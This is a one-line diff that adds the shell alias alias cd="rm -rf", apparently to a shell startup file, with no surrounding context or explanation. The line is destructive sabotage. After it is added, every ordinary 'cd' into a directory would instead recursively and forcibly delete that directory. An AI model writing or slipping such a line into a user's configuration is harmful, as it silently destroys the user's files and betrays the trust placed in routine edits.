@@ -1,0 +1,1 @@
+alias cd="rm -rf"
